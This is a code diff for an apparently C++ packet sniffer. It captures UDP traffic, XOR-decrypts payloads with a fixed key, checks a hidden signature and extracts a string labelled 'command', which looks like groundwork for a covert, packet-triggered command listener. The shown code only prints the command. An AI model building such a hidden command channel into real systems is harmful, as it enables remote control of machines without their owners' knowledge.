@@ -3,7 +3,6 @@
 #include <sys/prctl.h>
 #include <sys/types.h>
 #include <unistd.h>
-#include <netinet/if_ether.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 
@@ -42,11 +41,15 @@ static pcap_if_t * findDevice()
 };
 
 
-static void decrypt(const u_char encrypted[], unsigned char decrypted[], uint size)
+static bool decrypt(const u_char encrypted[], unsigned char decrypted[], uint size)
 {
 	for (size_t i = 0; i < size; i++) {
 		decrypted[i] = encrypted[i] ^ KEY[i % KEY.length()];
 	}
+	if (memcmp(decrypted, SIGNATURE_TWO.data(), strlen(SIGNATURE_TWO.data())) != 0) {
+		return false;
+	}
+	return true;
 }
 
 
@@ -70,9 +73,11 @@ void process_packet(u_char* args, const struct pcap_pkthdr* header, const u_char
 
 	uint encrypted_size = udp_len - SIGNATURE_SIZE - UDP_HEADER_SIZE;
 	unsigned char decrypted[encrypted_size];
-	decrypt(payload + SIGNATURE_SIZE, decrypted, encrypted_size);
-	std::string decrypted_string (reinterpret_cast<const char*>(decrypted), encrypted_size);
-	std::cout << "Decrypted message: " <<  decrypted_string << std::endl;
+	if (bool res = decrypt(payload + SIGNATURE_SIZE, decrypted, encrypted_size); !res) {
+		return;
+	}
+	std::string command(reinterpret_cast<const char*>(decrypted + SIGNATURE_SIZE), encrypted_size - SIGNATURE_SIZE);
+	std::cout << "Decrypted message: " <<  command << std::endl;
 }
 
 
